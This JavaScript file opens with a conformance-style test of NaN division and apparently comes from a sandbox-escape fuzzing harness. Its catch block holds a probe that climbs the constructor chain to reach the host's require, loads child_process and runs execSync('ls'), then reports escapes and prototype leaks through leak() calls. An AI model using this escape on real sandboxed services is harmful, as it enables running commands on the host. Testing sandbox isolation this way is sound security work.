try {
    if (isNaN(Number.NaN / Number.NaN) !== true) {
        $ERROR('#1: NaN / NaN === Not-a-Number. Actual: ' + NaN / NaN);
    }
    if (isNaN(Number.NaN / +0) !== true) {
        $ERROR('#2: NaN / +0 === Not-a-Number. Actual: ' + NaN / +0);
    }
    if (isNaN(Number.NaN / -0) !== true) {
        $ERROR('#3: NaN / -0 === Not-a-Number. Actual: ' + NaN / -0);
    }
    if (isNaN(Number.NaN / Number.POSITIVE_INFINITY) !== true) {
        $ERROR('#4: NaN / Infinity === Not-a-Number. Actual: ' + NaN / Infinity);
    }
    if (isNaN(Number.NaN / Number.NEGATIVE_INFINITY) !== true) {
        $ERROR('#5: NaN / -Infinity === Not-a-Number. Actual: ' + NaN / -Infinity);
    }
    if (isNaN(Number.NaN / Number.MAX_VALUE) !== true) {
        $ERROR('#6: NaN / Number.MAX_VALUE === Not-a-Number. Actual: ' + NaN / Number.MAX_VALUE);
    }
    if (isNaN(Number.NaN / Number.MIN_VALUE) !== true) {
        $ERROR('#7: NaN / Number.MIN_VALUE === Not-a-Number. Actual: ' + NaN / Number.MIN_VALUE);
    }
    if (isNaN(Number.NaN / 1) !== true) {
        $ERROR('#8: NaN / 1 === Not-a-Number. Actual: ' + NaN / 1);
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}